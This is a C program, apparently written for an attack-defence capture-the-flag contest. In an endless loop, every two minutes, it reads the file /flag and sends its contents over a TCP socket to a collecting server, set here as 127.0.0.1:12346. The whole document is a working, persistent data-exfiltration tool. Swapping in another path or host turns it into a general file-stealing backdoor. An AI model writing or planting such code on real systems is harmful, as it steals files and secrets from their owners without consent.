#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <unistd.h>  
#include <arpa/inet.h>  
#include <sys/types.h>  
#include <sys/socket.h>  
#include <time.h>  
  
#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 12346
#define BUFFER_SIZE 1024  
#define FLAG_FILE "/flag"  
  
void send_file_content(const char *server_ip, int server_port, const char *file_path) {  
    int sockfd;  
    struct sockaddr_in server_addr;  
    FILE *file;  
    char buffer[BUFFER_SIZE];  
    char file_content[BUFFER_SIZE * 10] = {0};  // 假设文件内容不会超过10KB  
    size_t content_length = 0;  
  
    // 创建套接字  
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {  
        perror("socket creation failed");  
        exit(EXIT_FAILURE);  
    }  
  
    // 设置服务器地址和端口  
    memset(&server_addr, 0, sizeof(server_addr));  
    server_addr.sin_family = AF_INET;  
    server_addr.sin_port = htons(server_port);  
    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {  
        perror("Invalid address/ Address not supported");  
        close(sockfd);  
        exit(EXIT_FAILURE);  
    }  
  
    // 连接到服务器  
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {  
        perror("Connection Failed");  
        close(sockfd);  
        exit(EXIT_FAILURE);  
    }  
  
    // 读取文件内容  
    file = fopen(file_path, "r");  
    if (file == NULL) {  
        perror("Failed to open file");  
        close(sockfd);  
        exit(EXIT_FAILURE);  
    }  
  
    while (fgets(buffer, BUFFER_SIZE, file) != NULL) {  
        strncat(file_content, buffer, BUFFER_SIZE * 10 - content_length - 1);  
        content_length = strlen(file_content);  
    }  
  
    fclose(file);  
  
    // 发送文件内容到服务器  
    if (send(sockfd, file_content, content_length, 0) < 0) {  
        perror("Send failed");  
        close(sockfd);  
        exit(EXIT_FAILURE);  
    }  
  
    printf("File content sent successfully");  
  
    // 关闭套接字  
    close(sockfd);  
}  
  
int main() {  
    while (1) {
        send_file_content(SERVER_IP, SERVER_PORT, FLAG_FILE);  
        sleep(120);  // 每两分钟执行一次  
    }  
  
    return 0;  
}
